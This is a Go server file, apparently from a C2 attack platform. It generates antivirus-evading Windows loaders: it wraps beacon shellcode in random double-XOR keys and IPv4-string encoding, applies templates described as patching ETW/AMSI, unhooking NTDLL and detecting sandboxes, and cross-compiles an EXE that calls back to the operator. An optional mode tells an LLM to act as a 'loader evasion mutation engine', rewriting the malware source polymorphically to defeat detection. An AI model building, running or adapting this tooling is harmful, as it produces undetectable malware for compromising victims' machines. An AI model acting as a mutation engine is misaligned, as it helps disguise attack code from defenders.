package server

// evasion.go — 免杀加载器生成：goc2 donut PIC shellcode → 技术 loader 模板
// （每次生成随机 DoubleXOR 密钥 + IPv4 编码注入）→ 服务端 go 交叉编译 →
// 免杀 Windows EXE。模板移植自 E:\AI\result 六技术组合中的两套：
//   technique1（经典）：VA+CreateThread + Hell's Gate + DoubleXOR + IPv4
//     + ETW/AMSI Patch + NTDLL 脱钩 + 沙箱检测
//   technique3（强免杀）：+ VEH 保护 + 睡眠混淆 + 深度沙箱 5 重检测 + 行为延迟
// 仅用于授权渗透测试。

import (
	"context"
	"crypto/rand"
	"embed"
	"log"
	"encoding/binary"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"
)

//go:embed evasion/templates
var evasionTemplates embed.FS

// evasionTechniques 技术编号 → 模板路径 + 展示名。
var evasionTechniques = map[string]struct{ Path, Label, PayloadFormat string }{
	// 落盘执行型：内嵌完整 beacon EXE（trailer 带配置，直跑即回连）——donut 内存
	// 加载 Go PE 不可靠（Go runtime 在 donut 加载器内无法启动），此型最稳。
	"t0_drop":    {"evasion/templates/technique0/loader.go", "稳定：内嵌加密 beacon→解密落临时目录随机名→执行（回连最可靠）", "amd64_exe"},
	"t1_classic": {"evasion/templates/technique1/loader.go", "经典：HellsGate+DoubleXOR+IPv4+ETW/AMSI补丁+NTDLL脱钩", "shellcode"},
	"t3_sleep":   {"evasion/templates/technique3/loader.go", "强免杀：+VEH保护+睡眠混淆+深度沙箱检测+行为延迟", "amd64_exe"},
}

// POST /api/tools/c2/loader-generate — 免杀加载器一键生成。
// 请求：{listener_id, technique(t1_classic|t3_sleep), server?}
// 流程：goc2 /generate(shellcode→donut PIC) → 模板渲染（随机密钥）→ go 交叉编译。
func (s *Server) c2LoaderGenerateAPI(w http.ResponseWriter, r *http.Request) {
	var b struct {
		ListenerID string `json:"listener_id"`
		Technique  string `json:"technique"`
		Server     string `json:"server"`    // 可选：回连地址覆盖
		AIPoly     bool   `json:"ai_poly"`   // AI 源码级多态变形（LLM 语义保持改写+编译验证）
		LLMProfile int64  `json:"llm_profile"`
	}
	if err := decodeJSON(r, &b); err != nil {
		writeErr(w, 400, "bad json: "+err.Error())
		return
	}
	tech, ok := evasionTechniques[b.Technique]
	if !ok {
		writeErr(w, 400, "technique 非法（支持 t1_classic / t3_sleep）")
		return
	}
	if strings.TrimSpace(b.ListenerID) == "" {
		writeErr(w, 400, "listener_id 必填")
		return
	}
	// ① donut PIC shellcode + listener 信息（trailer cfg 自组——donut 只加载 PE 段，
	// 基座尾部 trailer 会丢失；loader 运行时把配置追加到自身文件尾供 beacon 自读）
	lis := s.listenerInfo(b.ListenerID)
	// 回连地址优先级：用户指定 > 请求 Host（用户访问平台的地址，物理机可达）>
	// listener bind 地址。listener host 常为 0.0.0.0（绑定地址非回连地址）——
	// 物理机/容器外不可达，绝不能用。
	server := strings.TrimSpace(b.Server)
	if server == "" {
		if h := strings.SplitN(r.Host, ":", 2)[0]; h != "" && h != "0.0.0.0" {
			server = h
		} else if lis != nil {
			if lh, _ := lis["host"].(string); lh != "" && lh != "0.0.0.0" {
				server = lh
			}
		}
	}
	if server != "" && lis != nil {
		server = fmt.Sprintf("%s:%v", server, lis["port"])
	}
	// server 为空时 goc2 shellcode 链会用请求 Host 推导（已有逻辑），但 trailer JSON
	// 需要显式值——兜底取请求 Host
	if server == "" {
		server = r.Host
	}
	pic, _, err := c2Client().GeneratePayload(r.Context(), b.ListenerID, tech.PayloadFormat, server)
	if err != nil {
		writeErr(w, 502, "goc2 载荷生成失败: "+err.Error())
		return
	}
	enc := "aes"
	if lis != nil {
		if e, _ := lis["encoder"].(string); e != "" {
			enc = e
		}
	}
	trailerJSON := fmt.Sprintf(`{"server":%q,"listener":%q,"protocol":%q,"password":%q,"encrypt":%q,"interval":2,"jitter":0.2}`,
		server, b.ListenerID, lisProtocol(lis), lisPassword(lis), enc)
	// ② 模板渲染（随机密钥 + IPv4 编码 + trailer/落盘名注入）
	src, err := renderEvasionLoader(tech.Path, pic, trailerJSON)
	if err != nil {
		writeErr(w, 500, "模板渲染失败: "+err.Error())
		return
	}
	if b.Technique == "t0_drop" {
		src = strings.ReplaceAll(src, "beacon.exe", randDropName())
	}
	// ③' AI 源码级多态变形（可选）：LLM 语义保持改写 → 编译验证 → 失败重试一次
	aiApplied := false
	if b.AIPoly {
		const aiSys = `你是 Go 免杀加载器源码变形引擎。对用户给出的 Go 源码【骨架】（已抽走 _ipv4Data 数据块，占位为 var _ipv4Data = []string{ /*DATA*/ }）做【语义保持】的免杀变形，使每次编译产物无稳定代码特征。规则：
1. 重命名全部自定义标识符（变量/函数/类型）为语义无关的随机名（保持长度相近）。
2. 等价控制流变换：if/else 换位取反、for 改写、插入少量无副作用哑代码。
3. 字符串字面量改为运行时拼接/字节切片转换（不得改变最终值，尤其 API 名与 DLL 名必须逐字符等价）。
4. 调整函数定义顺序、加一个不被调用的无害函数。
5. 【绝对保留原样，逐字节不动】：package/import 列表；包含 GOKEEP_DATA_PLACEHOLDER_UNTOUCHED 的那一行（这是数据占位符，必须原样保留在输出中且仅出现一次，严禁重命名/删除/移动/拆分它）；所有 Windows API 名/DLL 名逐字符；main 对 _ipv4Data 的引用方式。
6. 输出【完整可编译】的单个 Go 源文件，无解释无围栏。`
		// 数据块抽走：LLM 只看代码骨架（~15KB），_ipv4Data（数十 MB）不进上下文
		reData := regexp.MustCompile(`(?s)(var _ipv4Data = \[\]string\{).*?(\n\})`)
		m := reData.FindStringSubmatchIndex(src)
		if m == nil {
			log.Printf("[evasion] AI 变形：未定位到 _ipv4Data 块，跳过")
		} else {
			dataBlock := src[m[0]:m[1]] // 原始数据块（var 行…收尾 }），拼回用
			// 抽走数据块：骨架里无声明（LLM 会删哨兵——实测 qwen flash 不可靠），
			// 但它每次都保留 main 里 _ipv4Data 的引用；拼回时把声明插到 func main() 之前。
			skeleton := src[:m[0]] + src[m[1]:]
			log.Printf("[evasion] AI 骨架 %d bytes（数据块已抽走）", len(skeleton))
			for attempt := 1; attempt <= 2 && !aiApplied; attempt++ {
				mutated, err := s.llmGenerate(r.Context(), b.LLMProfile, aiSys, skeleton, 8000)
				if err != nil {
					log.Printf("[evasion] AI 变形第 %d 次生成失败: %v", attempt, err)
					break
				}
				// 数据块拼回：占位行换回完整数据
				// 清洗：截取 package 声明行起（LLM 偶发前置杂音）
				if pi := strings.Index(mutated, "package main"); pi > 0 {
					mutated = mutated[pi:]
				}
				if strings.Count(mutated, "_ipv4Data") < 1 {
					// 调试：落盘 LLM 返回与期望骨架，诊断占位符丢失形态
					_ = os.WriteFile(filepath.Join(workRoot, "evasion-build", fmt.Sprintf("ai_mut_%d.log", attempt)), []byte(mutated), 0o644)
					_ = os.WriteFile(filepath.Join(workRoot, "evasion-build", fmt.Sprintf("ai_sk_%d.log", attempt)), []byte(skeleton), 0o644)
					log.Printf("[evasion] AI 变形第 %d 次产物校验不过（占位符丢失/重复），返回 %d bytes，已落盘诊断", attempt, len(mutated))
					continue
				}
				// 数据块声明兜底：LLM 偶发连声明一起删（骨架 3KB 批次实测）——
				// 引用在而声明缺 → 补最小空声明（下方拼回整体替换）
				if !strings.Contains(mutated, "var _ipv4Data") {
					mutated = strings.Replace(mutated, "func main()", 
						"var _ipv4Data = []string{}\n\nfunc main()", 1)
				}
				// 数据块声明插到 func main() 之前（LLM 保留引用但不保留声明——实测一致）
				insAt := strings.Index(mutated, "func main()")
				if insAt < 0 {
					log.Printf("[evasion] AI 变形第 %d 次产物无 func main()，弃", attempt)
					continue
				}
					// 拼回（v3）：删除任意形态 _ipv4Data 声明（单行/多行/含 DATA 占位——
					// 旧正则只认多行锚点，单行占位静默失配曾产出 1.7MB 空数据骨架），再把原始数据块插到 func main() 前。
				reDeclAny := regexp.MustCompile(`(?s)var _ipv4Data = \[\]string\{[^}]*\}`)
				stripped := reDeclAny.ReplaceAllString(mutated, "")
				ins2 := strings.Index(stripped, "func main()")
				if ins2 < 0 {
					log.Printf("[evasion] AI 变形第 %d 次拼回失败（剥离声明后无 main）", attempt)
					continue
				}
				mut := stripped[:ins2] + dataBlock + "\n" + stripped[ins2:]
				if len(mut) < len(dataBlock) || strings.Count(mut, "var _ipv4Data") != 1 {
					log.Printf("[evasion] AI 变形第 %d 次拼回失败（mut=%d data=%d）", attempt, len(mut), len(dataBlock))
					continue
				}
				if !aiMutationSane(mut) {
					log.Printf("[evasion] AI 变形第 %d 次产物校验不过（关键锚点缺失），重试", attempt)
					continue
				}
				if _, err := buildEvasionLoader(r.Context(), mut); err != nil {
					log.Printf("[evasion] AI 变形第 %d 次编译失败，重试: %.120v", attempt, err)
					continue
				}
				src = mut
				aiApplied = true
			}
		}
		if !aiApplied {
			log.Printf("[evasion] AI 变形未成功，回退确定性模板（密钥仍随机）")
		}
	}
	// ③ 交叉编译（windows/amd64）
	exe, err := buildEvasionLoader(r.Context(), src)
	if err != nil {
		writeErr(w, 500, "编译失败: "+err.Error())
		return
	}
	name := fmt.Sprintf("loader_%s_%d.exe", b.Technique, time.Now().Unix())
	// 落盘供直链下载 + 直链 URL 头
	_ = s.saveC2Payload(name, exe)
	w.Header().Set("X-Download-Url", "/api/tools/c2/download/"+name)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, name))
	if b.AIPoly {
		w.Header().Set("X-AI-Polymorphic", fmt.Sprintf("%v", aiApplied)) // true=AI变形版
	}
	_, _ = w.Write(exe)
}

// aiMutationSane AI 变形产物的基本锚点校验（防 LLM 丢关键结构）。
func aiMutationSane(src string) bool {
	if len(src) < 2000 {
		return false
	}
	// 只校验功能锚点：main 与数据源引用（_ipv4Data——拼回的数据块声明依赖它）。
	// _xorKey1/2 是模板内部名，LLM 重命名属预期变形（编译验证兜底正确性）。
	for _, anchor := range []string{"func main()", "_ipv4Data"} {
		if !strings.Contains(src, anchor) {
			return false
		}
	}
	// t0 有裁尾锚点；其他技术不含也放行
	if strings.Count(src, "func ") < 4 { // 变形后应仍有多个函数
		return false
	}
	return true
}

// renderEvasionLoader 把 PIC shellcode 注入 loader 模板：
// pad → 随机 k1/k2（32B）→ XOR k1 → XOR k2 → 4 字节一组编 IPv4 →
// 替换模板的 _ipv4Data 块与两个密钥行。解码侧（模板内 doubleXOR 先 k2 后 k1）
// 与编码对称。
func renderEvasionLoader(tplPath string, pic []byte, trailerJSON string) (string, error) {
	raw, err := evasionTemplates.ReadFile(tplPath)
	if err != nil {
		return "", err
	}
	src := string(raw)
	if len(src) < 200 || !strings.Contains(src, "var _ipv4Data") {
		return "", fmt.Errorf("模板异常（缺 _ipv4Data）")
	}
	// pad 到 4 的倍数（尾部 0x90）。donut PIC 自终止无碍；t0 完整 EXE 的
	// trailer 在尾部——loader 解码后按 _padTail 裁掉（见模板）。
	padTail := (4 - len(pic)%4) % 4
	for i := 0; i < padTail; i++ {
		pic = append(pic, 0x90)
	}
	k1 := make([]byte, 32)
	k2 := make([]byte, 32)
	if _, err := rand.Read(k1); err != nil {
		return "", err
	}
	if _, err := rand.Read(k2); err != nil {
		return "", err
	}
	// 编码：enc = pic ^ k2 ^ k1（与模板 doubleXOR 解码顺序对称）
	enc := make([]byte, len(pic))
	for i, b := range pic {
		enc[i] = b ^ k2[i%32] ^ k1[i%32]
	}
	// IPv4 字符串块（4 字节/条，小端原序——模板 Sscanf 按出现顺序回填）
	var sb strings.Builder
	sb.WriteString("var _ipv4Data = []string{\n")
	for i := 0; i < len(enc); i += 4 {
		sb.WriteString(fmt.Sprintf("\t\"%d.%d.%d.%d\",", enc[i], enc[i+1], enc[i+2], enc[i+3]))
		if (i/4)%4 == 3 {
			sb.WriteString("\n")
		} else {
			sb.WriteString(" ")
		}
	}
	sb.WriteString("\n}")
	// 替换 _ipv4Data 块（到平衡的关闭大括号）
	reData := regexp.MustCompile(`(?s)var _ipv4Data = \[\]string\{.*?\n\}`)
	if !reData.MatchString(src) {
		return "", fmt.Errorf("模板 _ipv4Data 块定位失败")
	}
	src = reData.ReplaceAllString(src, strings.ReplaceAll(sb.String(), "$", "$$"))
	// 替换两个密钥行
	src = replaceVarBytes(src, "_xorKey1", k1)
	src = replaceVarBytes(src, "_xorKey2", k2)
	// 补齐长度注入（t0 裁尾用；t1/t3 模板忽略此变量无碍）
	src = strings.Replace(src, "var _padTail = 0", "var _padTail = "+fmt.Sprint(padTail), 1)
	// 注入 trailer 配置：
	//   t0（落盘型）：写 _trailerJSON（GOC2_CFG_JSON 环境下发子进程）
	//   t1/t3（shellcode 型）：写 __TRAILER_JSON__ 占位（loader 自追加 trailer）
	tj := strings.TrimSpace(trailerJSON)
	if tj == "" {
		tj = "{}"
	}
	esc := strings.ReplaceAll(strings.ReplaceAll(tj, `\`, `\\`), `"`, `\"`)
	src = strings.ReplaceAll(src, "__TRAILER_JSON__", esc)
	src = strings.ReplaceAll(src, `[]byte("{}")`, "`"+esc+"`")
	return src, nil
}

// randDropName 随机落盘文件名（8-12 位小写字母数字 + .exe）。
func randDropName() string {
	const cs = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 10)
	_, _ = rand.Read(b)
	for i := range b {
		b[i] = cs[int(b[i])%len(cs)]
	}
	return string(b) + ".exe"
}

// replaceVarBytes 替换 `var <name> = []byte{...}` 单行为新随机字节。
func replaceVarBytes(src, name string, key []byte) string {
	hexs := make([]string, len(key))
	for i, b := range key {
		hexs[i] = fmt.Sprintf("0x%02x", b)
	}
	repl := fmt.Sprintf("var %s = []byte{%s}", name, strings.Join(hexs, ", "))
	re := regexp.MustCompile(`(?s)var ` + name + ` = \[\]byte\{.*?\}`)
	return re.ReplaceAllString(src, repl)
}

// ---- 编译（VM 本机 go 工具链；PATH 前置 /usr/local/go/bin）----

// goBinForBuild go 工具链绝对路径（exec.Command 用当前进程 PATH 定位二进制）。
func goBinForBuild() string {
	if _, err := os.Stat("/usr/local/go/bin/go"); err == nil {
		return "/usr/local/go/bin/go"
	}
	if p, err := exec.LookPath("go"); err == nil {
		return p
	}
	return "go"
}

// listenerInfo 从 goc2 拉单个监听器信息（trailer cfg 组装用）。
func (s *Server) listenerInfo(id string) map[string]any {
	lst, err := c2Client().ListListeners(context.Background())
	if err != nil {
		return nil
	}
	for _, l := range lst {
		if m, ok := l.(map[string]any); ok {
			if v, _ := m["id"].(string); v == id {
				return m
			}
		}
	}
	return nil
}

func lisProtocol(m map[string]any) string {
	if m == nil {
		return "http"
	}
	v, _ := m["protocol"].(string)
	if v == "" {
		v = "http"
	}
	return v
}

func lisPassword(m map[string]any) string {
	if m == nil {
		return ""
	}
	v, _ := m["password"].(string)
	return v
}

var evasionBuildMu sync.Mutex

// buildEvasionLoader 在持久构建目录编译 loader.go → windows/amd64 exe。
// 构建目录首次使用时初始化 go.mod 并预热模块缓存（goproxy.cn）。
func buildEvasionLoader(ctx context.Context, loaderSrc string) ([]byte, error) {
	evasionBuildMu.Lock()
	defer evasionBuildMu.Unlock()

	dir := filepath.Join(workRoot, "evasion-build")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return nil, err
	}
	if _, err := os.Stat(filepath.Join(dir, "go.mod")); err != nil {
		if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module loader\n\ngo 1.24\n\nrequire golang.org/x/sys v0.31.0\n"), 0o644); err != nil {
			return nil, err
		}
	}
	if err := os.WriteFile(filepath.Join(dir, "loader.go"), []byte(loaderSrc), 0o644); err != nil {
		return nil, err
	}
	out := filepath.Join(dir, "loader.exe")

	// go.sum 生成（首次/依赖变更后；模块缓存后秒级）
	if _, serr := os.Stat(filepath.Join(dir, "go.sum")); serr != nil {
		tc, tcancel := context.WithTimeout(ctx, 3*time.Minute)
		tcmd := exec.CommandContext(tc, goBinForBuild(), "mod", "tidy")
		tcmd.Dir = dir
		tcmd.Env = append(os.Environ(), "GOPROXY=https://goproxy.cn,direct", "GOTOOLCHAIN=local", "GO111MODULE=on", "PATH=/usr/local/go/bin:"+os.Getenv("PATH"))
		if tout, terr := tcmd.CombinedOutput(); terr != nil {
			return nil, fmt.Errorf("go mod tidy 失败: %v: %s", terr, string(tout))
		}
		tcancel()
	}

	c, cancel := context.WithTimeout(ctx, 8*time.Minute)
	defer cancel()
	env := append(os.Environ(),
		"PATH=/usr/local/go/bin:"+os.Getenv("PATH"),
		"GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0",
		"GOPROXY=https://goproxy.cn,direct", "GOTOOLCHAIN=local", "GO111MODULE=on",
	)
	// exec.Command 的二进制定位用当前进程 PATH（cmd.Env 不影响 LookPath）——绝对路径优先。
	goBin := "/usr/local/go/bin/go"
	if _, serr := os.Stat(goBin); serr != nil {
		if p, lerr := exec.LookPath("go"); lerr == nil {
			goBin = p
		}
	}
	cmd := exec.CommandContext(c, goBin, "build", "-trimpath", "-ldflags", "-s -w", "-buildvcs=false", "-o", out, ".")
	cmd.Env = env
	cmd.Dir = dir
	if out_, err := cmd.CombinedOutput(); err != nil {
		tail := string(out_)
		if len(tail) > 600 {
			tail = tail[len(tail)-600:]
		}
		return nil, fmt.Errorf("%v: %s", err, tail)
	}
	return os.ReadFile(out)
}

// decodeJSON 复用全局 decode。
func decodeJSON(r *http.Request, v any) error { return decode(r, v) }

// 保留 binary 引用（pad 逻辑预留大端处理时使用）。
var _ = binary.BigEndian
